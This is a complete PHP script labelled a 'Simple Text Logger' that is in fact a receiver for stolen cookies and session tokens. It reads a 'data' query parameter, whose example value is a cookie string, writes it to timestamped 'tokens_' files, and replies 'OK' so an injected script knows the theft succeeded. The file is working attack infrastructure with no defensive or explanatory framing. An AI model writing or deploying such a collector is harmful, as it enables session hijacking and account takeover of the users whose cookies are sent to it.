<?php
// log.php - Simple Text Logger
header('Content-Type: text/plain');

// Get the data from the URL query string (e.g., ?data=cookie1=value1;cookie2=value2)
$data = $_GET['data'];

if ($data) {
    // Create a filename with timestamp
    $filename = "tokens_" . date('Y-m-d_H-i-s') . ".txt";
    
    // Save the data
    file_put_contents($filename, $data . "\n\n", FILE_APPEND);
    
    // Return a simple OK so the script knows it worked
    echo "OK";
} else {
    echo "NO DATA";
}
?>
